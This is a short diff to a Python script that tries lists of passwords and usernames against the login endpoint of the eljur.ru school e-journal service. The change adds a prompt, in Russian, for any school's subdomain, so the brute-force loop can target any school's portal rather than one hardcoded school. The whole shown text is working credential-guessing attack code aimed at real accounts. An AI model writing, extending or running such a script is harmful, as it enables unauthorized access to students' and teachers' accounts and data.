@@ -9,6 +9,7 @@ import time
 
 print()
 init()
+schooldomain = input('Введите домен вашей школы. (символы перед .eljure.ru, Например - soch152: ')
 for i in paswords:
     for x in usernames:
         start_time = time.time()
@@ -17,7 +18,7 @@ for i in paswords:
             'password':i
         }
 
-        req = post('https://soch152.eljur.ru/ajaxauthorize', params=params)
+        req = post(f'https://{schooldomain}.eljur.ru/ajaxauthorize', params=params)
 
         answ = req.json()['result']
         if answ is False:
